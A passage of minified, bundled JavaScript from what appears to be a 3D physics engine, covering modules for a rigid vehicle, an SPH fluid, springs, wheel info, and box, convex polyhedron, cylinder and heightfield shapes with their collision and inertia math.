e.getVelocityAtWorldPoint(t,a),i.getVelocityAtWorldPoint(n,s),a.vsub(s,c),-.2*r.dot(c)*(1/(e.invMass+i.invMass))}},{"../collision/Ray":9,"../collision/RaycastResult":10,"../math/Quaternion":28,"../math/Vec3":30,"../objects/WheelInfo":36,"./Body":31}],33:[function(e,t,i){var n=e("./Body"),r=e("../shapes/Sphere"),o=e("../shapes/Box"),a=e("../math/Vec3"),s=e("../constraints/HingeConstraint");function c(e){if(this.wheelBodies=[],this.coordinateSystem=void 0===e.coordinateSystem?new a(1,2,3):e.coordinateSystem.clone(),this.chassisBody=e.chassisBody,!this.chassisBody){var t=new o(new a(5,2,.5));this.chassisBody=new n(1,t)}this.constraints=[],this.wheelAxes=[],this.wheelForces=[]}t.exports=c,c.prototype.addWheel=function(e){var t=(e=e||{}).body;t||(t=new n(1,new r(1.2))),this.wheelBodies.push(t),this.wheelForces.push(0),new a;var i=void 0!==e.position?e.position.clone():new a,o=new a;this.chassisBody.pointToWorldFrame(i,o),t.position.set(o.x,o.y,o.z);var c=void 0!==e.axis?e.axis.clone():new a(0,1,0);this.wheelAxes.push(c);var l=new s(this.chassisBody,t,{pivotA:i,axisA:c,pivotB:a.ZERO,axisB:c,collideConnected:!1});return this.constraints.push(l),this.wheelBodies.length-1},c.prototype.setSteeringValue=function(e,t){var i=this.wheelAxes[t],n=Math.cos(e),r=Math.sin(e),o=i.x,a=i.y;this.constraints[t].axisA.set(n*o-r*a,r*o+n*a,0)},c.prototype.setMotorSpeed=function(e,t){var i=this.constraints[t];i.enableMotor(),i.motorTargetVelocity=e},c.prototype.disableMotor=function(e){this.constraints[e].disableMotor()};var l=new a;c.prototype.setWheelForce=function(e,t){this.wheelForces[t]=e},c.prototype.applyWheelForce=function(e,t){var i=this.wheelAxes[t],n=this.wheelBodies[t],r=n.torque;i.scale(e,l),n.vectorToWorldFrame(l,l),r.vadd(l,r)},c.prototype.addToWorld=function(e){for(var t=this.constraints,i=this.wheelBodies.concat([this.chassisBody]),n=0;n<i.length;n++)e.add(i[n]);for(n=0;n<t.length;n++)e.addConstraint(t[n]);e.addEventListener("preStep",this._update.bind(this))},c.prototype._update=function(){for(var e=this.wheelForces,t=0;t<e.length;t++)this.applyWheelForce(e[t],t)},c.prototype.removeFromWorld=function(e){for(var t=this.constraints,i=this.wheelBodies.concat([this.chassisBody]),n=0;n<i.length;n++)e.remove(i[n]);for(n=0;n<t.length;n++)e.removeConstraint(t[n])};var h=new a;c.prototype.getWheelSpeed=function(e){var t=this.wheelAxes[e],i=this.wheelBodies[e].angularVelocity;return this.chassisBody.vectorToWorldFrame(t,h),i.dot(h)}},{"../constraints/HingeConstraint":15,"../math/Vec3":30,"../shapes/Box":37,"../shapes/Sphere":44,"./Body":31}],34:[function(e,t,i){t.exports=r,e("../shapes/Shape");var n=e("../math/Vec3");function r(){this.particles=[],this.density=1,this.smoothingRadius=1,this.speedOfSound=1,this.viscosity=.01,this.eps=1e-6,this.pressures=[],this.densities=[],this.neighbors=[]}e("../math/Quaternion"),e("../shapes/Particle"),e("../objects/Body"),e("../material/Material"),r.prototype.add=function(e){this.particles.push(e),this.neighbors.length<this.particles.length&&this.neighbors.push([])},r.prototype.remove=function(e){var t=this.particles.indexOf(e);-1!==t&&(this.particles.splice(t,1),this.neighbors.length>this.particles.length&&this.neighbors.pop())};var o=new n;r.prototype.getNeighbors=function(e,t){for(var i=this.particles.length,n=e.id,r=this.smoothingRadius*this.smoothingRadius,a=o,s=0;s!==i;s++){var c=this.particles[s];c.position.vsub(e.position,a),n!==c.id&&a.norm2()<r&&t.push(c)}};var a=new n,s=new n,c=new n,l=new n,h=new n,u=new n;r.prototype.update=function(){for(var e=this.particles.length,t=a,i=this.speedOfSound,n=this.eps,r=0;r!==e;r++){var o=this.particles[r];(S=this.neighbors[r]).length=0,this.getNeighbors(o,S),S.push(this.particles[r]);for(var d=S.length,p=0,f=0;f!==d;f++){o.position.vsub(S[f].position,t);var m=t.norm(),v=this.w(m);p+=S[f].mass*v}this.densities[r]=p,this.pressures[r]=i*i*(this.densities[r]-this.density)}var g=s,y=c,b=l,w=h,x=u;for(r=0;r!==e;r++){var _,M,S,T=this.particles[r];for(g.set(0,0,0),y.set(0,0,0),d=(S=this.neighbors[r]).length,f=0;f!==d;f++){var E=S[f];T.position.vsub(E.position,w);var A=w.norm();_=-E.mass*(this.pressures[r]/(this.densities[r]*this.densities[r]+n)+this.pressures[f]/(this.densities[f]*this.densities[f]+n)),this.gradw(w,b),b.mult(_,b),g.vadd(b,g),E.velocity.vsub(T.velocity,x),x.mult(1/(1e-4+this.densities[r]*this.densities[f])*this.viscosity*E.mass,x),M=this.nablaw(A),x.mult(M,x),y.vadd(x,y)}y.mult(T.mass,y),g.mult(T.mass,g),T.force.vadd(y,T.force),T.force.vadd(g,T.force)}},r.prototype.w=function(e){var t=this.smoothingRadius;return 315/(64*Math.PI*Math.pow(t,9))*Math.pow(t*t-e*e,3)},r.prototype.gradw=function(e,t){var i=e.norm(),n=this.smoothingRadius;e.mult(945/(32*Math.PI*Math.pow(n,9))*Math.pow(n*n-i*i,2),t)},r.prototype.nablaw=function(e){var t=this.smoothingRadius;return 945/(32*Math.PI*Math.pow(t,9))*(t*t-e*e)*(7*e*e-3*t*t)}},{"../material/Material":25,"../math/Quaternion":28,"../math/Vec3":30,"../objects/Body":31,"../shapes/Particle":41,"../shapes/Shape":43}],35:[function(e,t,i){var n=e("../math/Vec3");function r(e,t,i){i=i||{},this.restLength="number"==typeof i.restLength?i.restLength:1,this.stiffness=i.stiffness||100,this.damping=i.damping||1,this.bodyA=e,this.bodyB=t,this.localAnchorA=new n,this.localAnchorB=new n,i.localAnchorA&&this.localAnchorA.copy(i.localAnchorA),i.localAnchorB&&this.localAnchorB.copy(i.localAnchorB),i.worldAnchorA&&this.setWorldAnchorA(i.worldAnchorA),i.worldAnchorB&&this.setWorldAnchorB(i.worldAnchorB)}t.exports=r,r.prototype.setWorldAnchorA=function(e){this.bodyA.pointToLocalFrame(e,this.localAnchorA)},r.prototype.setWorldAnchorB=function(e){this.bodyB.pointToLocalFrame(e,this.localAnchorB)},r.prototype.getWorldAnchorA=function(e){this.bodyA.pointToWorldFrame(this.localAnchorA,e)},r.prototype.getWorldAnchorB=function(e){this.bodyB.pointToWorldFrame(this.localAnchorB,e)};var o=new n,a=new n,s=new n,c=new n,l=new n,h=new n,u=new n,d=new n,p=new n,f=new n,m=new n;r.prototype.applyForce=function(){var e=this.stiffness,t=this.damping,i=this.restLength,n=this.bodyA,r=this.bodyB,v=o,g=a,y=s,b=c,w=m,x=l,_=h,M=u,S=d,T=p,E=f;this.getWorldAnchorA(x),this.getWorldAnchorB(_),x.vsub(n.position,M),_.vsub(r.position,S),_.vsub(x,v);var A=v.norm();g.copy(v),g.normalize(),r.velocity.vsub(n.velocity,y),r.angularVelocity.cross(S,w),y.vadd(w,y),n.angularVelocity.cross(M,w),y.vsub(w,y),g.mult(-e*(A-i)-t*y.dot(g),b),n.force.vsub(b,n.force),r.force.vadd(b,r.force),M.cross(b,T),S.cross(b,E),n.torque.vsub(T,n.torque),r.torque.vadd(E,r.torque)}},{"../math/Vec3":30}],36:[function(e,t,i){var n=e("../math/Vec3"),r=e("../math/Transform"),o=e("../collision/RaycastResult"),a=e("../utils/Utils");function s(e){e=a.defaults(e,{chassisConnectionPointLocal:new n,chassisConnectionPointWorld:new n,directionLocal:new n,directionWorld:new n,axleLocal:new n,axleWorld:new n,suspensionRestLength:1,suspensionMaxLength:2,radius:1,suspensionStiffness:100,dampingCompression:10,dampingRelaxation:10,frictionSlip:1e4,steering:0,rotation:0,deltaRotation:0,rollInfluence:.01,maxSuspensionForce:Number.MAX_VALUE,isFrontWheel:!0,clippedInvContactDotSuspension:1,suspensionRelativeVelocity:0,suspensionForce:0,skidInfo:0,suspensionLength:0,maxSuspensionTravel:1,useCustomSlidingRotationalSpeed:!1,customSlidingRotationalSpeed:-.1}),this.maxSuspensionTravel=e.maxSuspensionTravel,this.customSlidingRotationalSpeed=e.customSlidingRotationalSpeed,this.useCustomSlidingRotationalSpeed=e.useCustomSlidingRotationalSpeed,this.sliding=!1,this.chassisConnectionPointLocal=e.chassisConnectionPointLocal.clone(),this.chassisConnectionPointWorld=e.chassisConnectionPointWorld.clone(),this.directionLocal=e.directionLocal.clone(),this.directionWorld=e.directionWorld.clone(),this.axleLocal=e.axleLocal.clone(),this.axleWorld=e.axleWorld.clone(),this.suspensionRestLength=e.suspensionRestLength,this.suspensionMaxLength=e.suspensionMaxLength,this.radius=e.radius,this.suspensionStiffness=e.suspensionStiffness,this.dampingCompression=e.dampingCompression,this.dampingRelaxation=e.dampingRelaxation,this.frictionSlip=e.frictionSlip,this.steering=0,this.rotation=0,this.deltaRotation=0,this.rollInfluence=e.rollInfluence,this.maxSuspensionForce=e.maxSuspensionForce,this.engineForce=0,this.brake=0,this.isFrontWheel=e.isFrontWheel,this.clippedInvContactDotSuspension=1,this.suspensionRelativeVelocity=0,this.suspensionForce=0,this.skidInfo=0,this.suspensionLength=0,this.sideImpulse=0,this.forwardImpulse=0,this.raycastResult=new o,this.worldTransform=new r,this.isInContact=!1}t.exports=s;var c=new n,l=new n;c=new n,s.prototype.updateWheel=function(e){var t=this.raycastResult;if(this.isInContact){var i=t.hitNormalWorld.dot(t.directionWorld);t.hitPointWorld.vsub(e.position,l),e.getVelocityAtWorldPoint(l,c);var n=t.hitNormalWorld.dot(c);if(i>=-.1)this.suspensionRelativeVelocity=0,this.clippedInvContactDotSuspension=10;else{var r=-1/i;this.suspensionRelativeVelocity=n*r,this.clippedInvContactDotSuspension=r}}else t.suspensionLength=this.suspensionRestLength,this.suspensionRelativeVelocity=0,t.directionWorld.scale(-1,t.hitNormalWorld),this.clippedInvContactDotSuspension=1}},{"../collision/RaycastResult":10,"../math/Transform":29,"../math/Vec3":30,"../utils/Utils":53}],37:[function(e,t,i){t.exports=a;var n=e("./Shape"),r=e("../math/Vec3"),o=e("./ConvexPolyhedron");function a(e){n.call(this),this.type=n.types.BOX,this.halfExtents=e,this.convexPolyhedronRepresentation=null,this.updateConvexPolyhedronRepresentation(),this.updateBoundingSphereRadius()}a.prototype=new n,a.prototype.constructor=a,a.prototype.updateConvexPolyhedronRepresentation=function(){var e=this.halfExtents.x,t=this.halfExtents.y,i=this.halfExtents.z,n=r,a=[new n(-e,-t,-i),new n(e,-t,-i),new n(e,t,-i),new n(-e,t,-i),new n(-e,-t,i),new n(e,-t,i),new n(e,t,i),new n(-e,t,i)],s=(new n(0,0,1),new n(0,1,0),new n(1,0,0),new o(a,[[3,2,1,0],[4,5,6,7],[5,4,0,1],[2,3,7,6],[0,4,7,3],[1,2,6,5]]));this.convexPolyhedronRepresentation=s,s.material=this.material},a.prototype.calculateLocalInertia=function(e,t){return t=t||new r,a.calculateInertia(this.halfExtents,e,t),t},a.calculateInertia=function(e,t,i){var n=e;i.x=1/12*t*(2*n.y*2*n.y+2*n.z*2*n.z),i.y=1/12*t*(2*n.x*2*n.x+2*n.z*2*n.z),i.z=1/12*t*(2*n.y*2*n.y+2*n.x*2*n.x)},a.prototype.getSideNormals=function(e,t){var i=e,n=this.halfExtents;if(i[0].set(n.x,0,0),i[1].set(0,n.y,0),i[2].set(0,0,n.z),i[3].set(-n.x,0,0),i[4].set(0,-n.y,0),i[5].set(0,0,-n.z),void 0!==t)for(var r=0;r!==i.length;r++)t.vmult(i[r],i[r]);return i},a.prototype.volume=function(){return 8*this.halfExtents.x*this.halfExtents.y*this.halfExtents.z},a.prototype.updateBoundingSphereRadius=function(){this.boundingSphereRadius=this.halfExtents.norm()};var s=new r;new r,a.prototype.forEachWorldCorner=function(e,t,i){for(var n=this.halfExtents,r=[[n.x,n.y,n.z],[-n.x,n.y,n.z],[-n.x,-n.y,n.z],[-n.x,-n.y,-n.z],[n.x,-n.y,-n.z],[n.x,n.y,-n.z],[-n.x,n.y,-n.z],[n.x,-n.y,n.z]],o=0;o<r.length;o++)s.set(r[o][0],r[o][1],r[o][2]),t.vmult(s,s),e.vadd(s,s),i(s.x,s.y,s.z)};var c=[new r,new r,new r,new r,new r,new r,new r,new r];a.prototype.calculateWorldAABB=function(e,t,i,n){var r=this.halfExtents;c[0].set(r.x,r.y,r.z),c[1].set(-r.x,r.y,r.z),c[2].set(-r.x,-r.y,r.z),c[3].set(-r.x,-r.y,-r.z),c[4].set(r.x,-r.y,-r.z),c[5].set(r.x,r.y,-r.z),c[6].set(-r.x,r.y,-r.z),c[7].set(r.x,-r.y,r.z);var o=c[0];t.vmult(o,o),e.vadd(o,o),n.copy(o),i.copy(o);for(var a=1;a<8;a++){o=c[a],t.vmult(o,o),e.vadd(o,o);var s=o.x,l=o.y,h=o.z;s>n.x&&(n.x=s),l>n.y&&(n.y=l),h>n.z&&(n.z=h),s<i.x&&(i.x=s),l<i.y&&(i.y=l),h<i.z&&(i.z=h)}}},{"../math/Vec3":30,"./ConvexPolyhedron":38,"./Shape":43}],38:[function(e,t,i){t.exports=a;var n=e("./Shape"),r=e("../math/Vec3"),o=(e("../math/Quaternion"),e("../math/Transform"));function a(e,t,i){n.call(this),this.type=n.types.CONVEXPOLYHEDRON,this.vertices=e||[],this.worldVertices=[],this.worldVerticesNeedsUpdate=!0,this.faces=t||[],this.faceNormals=[],this.computeNormals(),this.worldFaceNormalsNeedsUpdate=!0,this.worldFaceNormals=[],this.uniqueEdges=[],this.uniqueAxes=i?i.slice():null,this.computeEdges(),this.updateBoundingSphereRadius()}a.prototype=new n,a.prototype.constructor=a;var s=new r;a.prototype.computeEdges=function(){var e=this.faces,t=this.vertices,i=(t.length,this.uniqueEdges);i.length=0;for(var n=s,r=0;r!==e.length;r++)for(var o=e[r],a=o.length,c=0;c!==a;c++){var l=(c+1)%a;t[o[c]].vsub(t[o[l]],n),n.normalize();for(var h=!1,u=0;u!==i.length;u++)if(i[u].almostEquals(n)||i[u].almostEquals(n)){h=!0;break}h||i.push(n.clone())}},a.prototype.computeNormals=function(){this.faceNormals.length=this.faces.length;for(var e=0;e<this.faces.length;e++){for(var t=0;t<this.faces[e].length;t++)if(!this.vertices[this.faces[e][t]])throw new Error("Vertex "+this.faces[e][t]+" not found!");var i=this.faceNormals[e]||new r;this.getFaceNormal(e,i),i.negate(i),this.faceNormals[e]=i;var n=this.vertices[this.faces[e][0]];if(i.dot(n)<0)for(console.error(".faceNormals["+e+"] = Vec3("+i.toString()+") looks like it points into the shape? The vertices follow. Make sure they are ordered CCW around the normal, using the right hand rule."),t=0;t<this.faces[e].length;t++)console.warn(".vertices["+this.faces[e][t]+"] = Vec3("+this.vertices[this.faces[e][t]].toString()+")")}};var c=new r,l=new r;a.computeNormal=function(e,t,i,n){t.vsub(e,l),i.vsub(t,c),c.cross(l,n),n.isZero()||n.normalize()},a.prototype.getFaceNormal=function(e,t){var i=this.faces[e],n=this.vertices[i[0]],r=this.vertices[i[1]],o=this.vertices[i[2]];return a.computeNormal(n,r,o,t)};var h=new r;a.prototype.clipAgainstHull=function(e,t,i,n,o,a,s,c,l){for(var u=h,d=-1,p=-Number.MAX_VALUE,f=0;f<i.faces.length;f++){u.copy(i.faceNormals[f]),o.vmult(u,u);var m=u.dot(a);m>p&&(p=m,d=f)}for(var v=[],g=i.faces[d],y=g.length,b=0;b<y;b++){var w=i.vertices[g[b]],x=new r;x.copy(w),o.vmult(x,x),n.vadd(x,x),v.push(x)}d>=0&&this.clipFaceAgainstHull(a,e,t,v,s,c,l)};var u=new r,d=new r,p=new r,f=new r,m=new r,v=new r;a.prototype.findSeparatingAxis=function(e,t,i,n,r,o,a,s){var c=u,l=d,h=p,g=f,y=m,b=v,w=Number.MAX_VALUE;if(this.uniqueAxes)for(_=0;_!==this.uniqueAxes.length;_++){if(i.vmult(this.uniqueAxes[_],c),!1===(T=this.testSepAxis(c,e,t,i,n,r)))return!1;T<w&&(w=T,o.copy(c))}else for(var x=a?a.length:this.faces.length,_=0;_<x;_++){var M=a?a[_]:_;if(c.copy(this.faceNormals[M]),i.vmult(c,c),!1===(T=this.testSepAxis(c,e,t,i,n,r)))return!1;T<w&&(w=T,o.copy(c))}if(e.uniqueAxes)for(_=0;_!==e.uniqueAxes.length;_++){if(r.vmult(e.uniqueAxes[_],l),!1===(T=this.testSepAxis(l,e,t,i,n,r)))return!1;T<w&&(w=T,o.copy(l))}else for(var S=s?s.length:e.faces.length,_=0;_<S;_++){var T;if(M=s?s[_]:_,l.copy(e.faceNormals[M]),r.vmult(l,l),!1===(T=this.testSepAxis(l,e,t,i,n,r)))return!1;T<w&&(w=T,o.copy(l))}for(var E=0;E!==this.uniqueEdges.length;E++){i.vmult(this.uniqueEdges[E],g);for(var A=0;A!==e.uniqueEdges.length;A++)if(r.vmult(e.uniqueEdges[A],y),g.cross(y,b),!b.almostZero()){b.normalize();var C=this.testSepAxis(b,e,t,i,n,r);if(!1===C)return!1;C<w&&(w=C,o.copy(b))}}return n.vsub(t,h),h.dot(o)>0&&o.negate(o),!0};var g=[],y=[];a.prototype.testSepAxis=function(e,t,i,n,r,o){a.project(this,e,i,n,g),a.project(t,e,r,o,y);var s=g[0],c=g[1],l=y[0],h=y[1];if(s<h||l<c)return!1;var u=s-h,d=l-c;return u<d?u:d};var b=new r,w=new r;a.prototype.calculateLocalInertia=function(e,t){this.computeLocalAABB(b,w);var i=w.x-b.x,n=w.y-b.y,r=w.z-b.z;t.x=1/12*e*(2*n*2*n+2*r*2*r),t.y=1/12*e*(2*i*2*i+2*r*2*r),t.z=1/12*e*(2*n*2*n+2*i*2*i)},a.prototype.getPlaneConstantOfFace=function(e){var t=this.faces[e],i=this.faceNormals[e],n=this.vertices[t[0]];return-i.dot(n)};var x=new r,_=new r,M=new r,S=new r,T=new r,E=new r,A=new r,C=new r;a.prototype.clipFaceAgainstHull=function(e,t,i,n,r,o,a){for(var s=x,c=_,l=M,h=S,u=T,d=E,p=A,f=C,m=n,v=[],g=-1,y=Number.MAX_VALUE,b=0;b<this.faces.length;b++){s.copy(this.faceNormals[b]),i.vmult(s,s);var w=s.dot(e);w<y&&(y=w,g=b)}if(!(g<0)){var P=this.faces[g];P.connectedFaces=[];for(var L=0;L<this.faces.length;L++)for(var R=0;R<this.faces[L].length;R++)-1!==P.indexOf(this.faces[L][R])&&L!==g&&-1===P.connectedFaces.indexOf(L)&&P.connectedFaces.push(L);m.length;for(var k=P.length,O=0;O<k;O++){var I=this.vertices[P[O]],B=this.vertices[P[(O+1)%k]];I.vsub(B,c),l.copy(c),i.vmult(l,l),t.vadd(l,l),h.copy(this.faceNormals[g]),i.vmult(h,h),t.vadd(h,h),l.cross(h,u),u.negate(u),d.copy(I),i.vmult(d,d),t.vadd(d,d),d.dot(u);var D=P.connectedFaces[O];p.copy(this.faceNormals[D]);var z=this.getPlaneConstantOfFace(D);f.copy(p),i.vmult(f,f);var F=z-f.dot(t);for(this.clipFaceAgainstPlane(m,v,f,F);m.length;)m.shift();for(;v.length;)m.push(v.shift())}for(p.copy(this.faceNormals[g]),z=this.getPlaneConstantOfFace(g),f.copy(p),i.vmult(f,f),F=z-f.dot(t),L=0;L<m.length;L++){var N=f.dot(m[L])+F;if(N<=r&&(console.log("clamped: depth="+N+" to minDist="+r),N=r),N<=o){var j=m[L];if(N<=0){var U={point:j,normal:f,depth:N};a.push(U)}}}}},a.prototype.clipFaceAgainstPlane=function(e,t,i,n){var o,a,s=e.length;if(s<2)return t;var c=e[e.length-1],l=e[0];o=i.dot(c)+n;for(var h=0;h<s;h++){if(l=e[h],a=i.dot(l)+n,o<0)if(a<0)(u=new r).copy(l),t.push(u);else{var u=new r;c.lerp(l,o/(o-a),u),t.push(u)}else a<0&&(u=new r,c.lerp(l,o/(o-a),u),t.push(u),t.push(l));c=l,o=a}return t},a.prototype.computeWorldVertices=function(e,t){for(var i=this.vertices.length;this.worldVertices.length<i;)this.worldVertices.push(new r);for(var n=this.vertices,o=this.worldVertices,a=0;a!==i;a++)t.vmult(n[a],o[a]),e.vadd(o[a],o[a]);this.worldVerticesNeedsUpdate=!1},new r,a.prototype.computeLocalAABB=function(e,t){var i=this.vertices.length,n=this.vertices;e.set(Number.MAX_VALUE,Number.MAX_VALUE,Number.MAX_VALUE),t.set(-Number.MAX_VALUE,-Number.MAX_VALUE,-Number.MAX_VALUE);for(var r=0;r<i;r++){var o=n[r];o.x<e.x?e.x=o.x:o.x>t.x&&(t.x=o.x),o.y<e.y?e.y=o.y:o.y>t.y&&(t.y=o.y),o.z<e.z?e.z=o.z:o.z>t.z&&(t.z=o.z)}},a.prototype.computeWorldFaceNormals=function(e){for(var t=this.faceNormals.length;this.worldFaceNormals.length<t;)this.worldFaceNormals.push(new r);for(var i=this.faceNormals,n=this.worldFaceNormals,o=0;o!==t;o++)e.vmult(i[o],n[o]);this.worldFaceNormalsNeedsUpdate=!1},a.prototype.updateBoundingSphereRadius=function(){for(var e=0,t=this.vertices,i=0,n=t.length;i!==n;i++){var r=t[i].norm2();r>e&&(e=r)}this.boundingSphereRadius=Math.sqrt(e)};var P=new r;a.prototype.calculateWorldAABB=function(e,t,i,n){for(var r,o,a,s,c,l,h=this.vertices.length,u=this.vertices,d=0;d<h;d++){P.copy(u[d]),t.vmult(P,P),e.vadd(P,P);var p=P;p.x<r||void 0===r?r=p.x:(p.x>s||void 0===s)&&(s=p.x),p.y<o||void 0===o?o=p.y:(p.y>c||void 0===c)&&(c=p.y),p.z<a||void 0===a?a=p.z:(p.z>l||void 0===l)&&(l=p.z)}i.set(r,o,a),n.set(s,c,l)},a.prototype.volume=function(){return 4*Math.PI*this.boundingSphereRadius/3},a.prototype.getAveragePointLocal=function(e){e=e||new r;for(var t=this.vertices.length,i=this.vertices,n=0;n<t;n++)e.vadd(i[n],e);return e.mult(1/t,e),e},a.prototype.transformAllPoints=function(e,t){var i=this.vertices.length,n=this.vertices;if(t){for(var r=0;r<i;r++){var o=n[r];t.vmult(o,o)}for(r=0;r<this.faceNormals.length;r++)o=this.faceNormals[r],t.vmult(o,o)}if(e)for(r=0;r<i;r++)(o=n[r]).vadd(e,o)};var L=new r,R=new r,k=new r;a.prototype.pointIsInside=function(e){var t=this.vertices.length,i=this.vertices,n=this.faces,r=this.faceNormals,o=this.faces.length,a=L;this.getAveragePointLocal(a);for(var s=0;s<o;s++){this.faces[s].length,t=r[s];var c=i[n[s][0]],l=R;e.vsub(c,l);var h=t.dot(l),u=k;a.vsub(c,u);var d=t.dot(u);if(h<0&&d>0||h>0&&d<0)return!1}return-1},new r;var O=new r,I=new r;a.project=function(e,t,i,n,r){var a=e.vertices.length,s=O,c=0,l=0,h=I,u=e.vertices;h.setZero(),o.vectorToLocalFrame(i,n,t,s),o.pointToLocalFrame(i,n,h,h);var d=h.dot(s);l=c=u[0].dot(s);for(var p=1;p<a;p++){var f=u[p].dot(s);f>c&&(c=f),f<l&&(l=f)}if((l-=d)>(c-=d)){var m=l;l=c,c=m}r[0]=c,r[1]=l}},{"../math/Quaternion":28,"../math/Transform":29,"../math/Vec3":30,"./Shape":43}],39:[function(e,t,i){t.exports=a;var n=e("./Shape"),r=e("../math/Vec3"),o=(e("../math/Quaternion"),e("./ConvexPolyhedron"));function a(e,t,i,a){var s=a,c=[],l=[],h=[],u=[],d=[],p=Math.cos,f=Math.sin;c.push(new r(t*p(0),t*f(0),.5*-i)),u.push(0),c.push(new r(e*p(0),e*f(0),.5*i)),d.push(1);for(var m=0;m<s;m++){var v=2*Math.PI/s*(m+1),g=2*Math.PI/s*(m+.5);m<s-1?(c.push(new r(t*p(v),t*f(v),.5*-i)),u.push(2*m+2),c.push(new r(e*p(v),e*f(v),.5*i)),d.push(2*m+3),h.push([2*m+2,2*m+3,2*m+1,2*m])):h.push([0,1,2*m+1,2*m]),(s%2==1||m<s/2)&&l.push(new r(p(g),f(g),0))}h.push(d),l.push(new r(0,0,1));var y=[];for(m=0;m<u.length;m++)y.push(u[u.length-m-1]);h.push(y),this.type=n.types.CONVEXPOLYHEDRON,o.call(this,c,h,l)}a.prototype=new o},{"../math/Quaternion":28,"../math/Vec3":30,"./ConvexPolyhedron":38,"./Shape":43}],40:[function(e,t,i){var n=e("./Shape"),r=e("./ConvexPolyhedron"),o=e("../math/Vec3"),a=e("../utils/Utils");function s(e,t){t=a.defaults(t,{maxValue:null,minValue:null,elementSize:1}),this.data=e,this.maxValue=t.maxValue,this.minValue=t.minValue,this.elementSize=t.elementSize,null===t.minValue&&this.updateMinValue(),null===t.maxValue&&this.updateMaxValue(),this.cacheEnabled=!0,n.call(this),this.pillarConvex=new r,this.pillarOffset=new o,this.type=n.types.HEIGHTFIELD,this.updateBoundingSphereRadius(),this._cachedPillars={}}t.exports=s,s.prototype=new n,s.prototype.update=function(){this._cachedPillars={}},s.prototype.updateMinValue=function(){for(var e=this.data,t=e[0][0],i=0;i!==e.length;i++)for(var n=0;n!==e[i].length;n++){var r=e[i][n];r<t&&(t=r)}this.minValue=t},s.prototype.updateMaxValue=function(){for(var e=this.data,t=e[0][0],i=0;i!==e.length;i++)for(var n=0;n!==e[i].length;n++){var r=e[i][n];r>t&&(t=r)}this.maxValue=t},s.prototype.setHeightValueAtIndex=function(e,t,i){this.data[e][t]=i,this.clearCachedConvexTrianglePillar(e,t,!1),e>0&&(this.clearCachedConvexTrianglePillar(e-1,t,!0),this.clearCachedConvexTrianglePillar(e-1,t,!1)),t>0&&(this.clearCachedConvexTrianglePillar(e,t-1,!0),this.clearCachedConvexTrianglePillar(e,t-1,!1)),t>0&&e>0&&this.clearCachedConvexTrianglePillar(e-1,t-1,!0)},s.prototype.getRectMinMax=function(e,t,i,n,r){r=r||[];for(var o=this.data,a=this.minValue,s=e;s<=i;s++)for(var c=t;c<=n;c++){var l=o[s][c];l>a&&(a=l)}r[0]=this.minValue,r[1]=a},s.prototype.getIndexOfPosition=function(e,t,i,n){var r=this.elementSize,o=this.data,a=Math.floor(e/r),s=Math.floor(t/r);return i[0]=a,i[1]=s,n&&(a<0&&(a=0),s<0&&(s=0),a>=o.length-1&&(a=o.length-1),s>=o[0].length-1&&(s=o[0].length-1)),!(a<0||s<0||a>=o.length-1||s>=o[0].length-1)},s.prototype.getHeightAt=function(e,t,i){var n=[];this.getIndexOfPosition(e,t,n,i);var r=[];return this.getRectMinMax(n[0],n[1]+1,n[0],n[1]+1,r),(r[0]+r[1])/2},s.prototype.getCacheConvexTrianglePillarKey=function(e,t,i){return e+"_"+t+"_"+(i?1:0)},s.prototype.getCachedConvexTrianglePillar=function(e,t,i){return this._cachedPillars[this.getCacheConvexTrianglePillarKey(e,t,i)]},s.prototype.setCachedConvexTrianglePillar=function(e,t,i,n,r){this._cachedPillars[this.getCacheConvexTrianglePillarKey(e,t,i)]={convex:n,offset:r}},s.prototype.clearCachedConvexTrianglePillar=function(e,t,i){delete this._cachedPillars[this.getCacheConvexTrianglePillarKey(e,t,i)]},s.prototype.getConvexTrianglePillar=function(e,t,i){var n=this.pillarConvex,a=this.pillarOffset;if(this.cacheEnabled){if(s=this.getCachedConvexTrianglePillar(e,t,i))return this.pillarConvex=s.convex,void(this.pillarOffset=s.offset);n=new r,a=new o,this.pillarConvex=n,this.pillarOffset=a}var s=this.data,c=this.elementSize,l=n.faces;n.vertices.length=6;for(var h=0;h<6;h++)n.vertices[h]||(n.vertices[h]=new o);for(l.length=5,h=0;h<5;h++)l[h]||(l[h]=[]);var u=n.vertices,d=(Math.min(s[e][t],s[e+1][t],s[e][t+1],s[e+1][t+1])-this.minValue)/2+this.minValue;i?(a.set((e+.75)*c,(t+.75)*c,d),u[0].set(.25*c,.25*c,s[e+1][t+1]-d),u[1].set(-.75*c,.25*c,s[e][t+1]-d),u[2].set(.25*c,-.75*c,s[e+1][t]-d),u[3].set(.25*c,.25*c,-d-1),u[4].set(-.75*c,.25*c,-d-1),u[5].set(.25*c,-.75*c,-d-1),l[0][0]=0,l[0][1]=1,l[0][2]=2,l[1][0]=5,l[1][1]=4,l[1][2]=3,l[2][0]=2,l[2][1]=5,l[2][2]=3,l[2][3]=0,l[3][0]=3,l[3][1]=4,l[3][2]=1,l[3][3]=0,l[4][0]=1,l[4][1]=4,l[4][2]=5,l[4][3]=2):(a.set((e+.25)*c,(t+.25)*c,d),u[0].set(-.25*c,-.25*c,s[e][t]-d),u[1].set(.75*c,-.25*c,s[e+1][t]-d),u[2].set(-.25*c,.75*c,s[e][t+1]-d),u[3].set(-.25*c,-.25*c,-d-1),u[4].set(.75*c,-.25*c,-d-1),u[5].set(-.25*c,.75*c,-d-1),l[0][0]=0,l[0][1]=1,l[0][2]=2,l[1][0]=5,l[1][1]=4,l[1][2]=3,l[2][0]=0,l[2][1]=2,l[2][2]=5,l[2][3]=3,l[3][0]=1,l[3][1]=0,l[3][2]=3,l[3][3]=4,l[4][0]=4,l[4][1]=5,l[4][2]=2,l[4][3]=1),n.computeNormals(),n.computeEdges(),n.updateBoundingSphereRadius(),this.setCachedConvexTrianglePillar(e,t,i,n,a)},s.prototype.calculateLocalInertia=function(e,t){return(t=t||new o).set(0,0,0),t},s.prototype.volume=function(){return Number.MAX_VALUE},s.prototype.calculateWorldAABB=function(e,t,i,n){i.set(-Number.MAX_VALUE,-Number.MAX_VALUE,-Number.MAX_VALUE),n.set(Number.MAX_VALUE,Number.MAX_VALUE,Number.MAX_VALUE)},s.prototype.updateBoundingSphereRadius=function(){var e=this.data,t=this.elementSize;this.boundingSphereRadius=new o(e.length*t,e[0].length*t,Math.max(Math.abs(this.maxValue),Math.abs(this.minValue))).norm()}},{"../math/Vec3":30,"../utils/Utils":53,"./ConvexPolyhedron":38,"./Shape":43}],41:[function(e,t,i){t.exports=o;var n=e("./Shape"),r=e("../math/Vec3");function 